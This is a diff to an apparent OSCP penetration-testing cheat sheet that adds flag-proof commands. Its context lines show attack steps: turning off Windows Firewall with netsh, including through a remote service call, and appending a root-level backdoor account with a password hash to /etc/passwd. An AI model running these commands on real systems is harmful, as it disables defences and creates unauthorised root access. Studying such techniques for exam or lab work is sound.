@@ -1100,6 +1100,9 @@ eventvwr-bypassuac-32.exe
 # Disable Windows Firewall
 netsh advfirewall set allprofiles state off
 service_exec(conn, r'cmd /c netsh advfirewall set allprofiles state off') 
+
+# OSCP Flag Proof
+type proof.txt && whoami && hostname && ipconfig
 ```
 
 #### Credential Access
@@ -1536,6 +1539,9 @@ echo "temp:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> /etc
 
 su temp
 pass pass123
+
+# OSCP Flag Proof
+cat proof.txt && whoami && hostname && ip addr
 ```
 
 #### Service Exploits
